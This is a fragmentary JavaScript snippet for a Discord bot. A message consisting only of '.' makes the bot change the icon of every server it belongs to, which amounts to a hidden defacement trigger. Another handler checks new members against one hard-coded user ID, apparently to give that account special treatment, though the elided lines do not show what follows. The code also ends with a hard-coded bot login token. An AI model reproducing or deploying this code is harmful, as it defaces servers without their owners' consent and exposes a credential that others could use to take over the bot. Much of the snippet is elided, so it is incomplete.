...
LOka.on('message', message => {
     if (message.content === ".") {
         LOka.guilds.forEach(m =>{
             m.setIcon(`https://cdn.discordapp.com/attachments/604005757280583711/612544017007247370/7ee6994ea97ee31e.jpg`)
})
}
});
LOka.on('message', message => {
...
LOka.on('message', message => {
     if (message.content === ".") {
             ...
             message.guild.setIcon(`https://cdn.discordapp.com/attachments/604005757280583711/612544017007247370/7ee6994ea97ee31e.jpg`)
...
LOka.on('guildMemberAdd', member => {
            ...
            if (member.id === "533132149277327371") {
...
LOka.login("NjEyNTQ2MjQwOTUyOTI2MjA5.XVj8Pg.enZBUwLlA6UYaOOC-Dx9HvT-Mio")
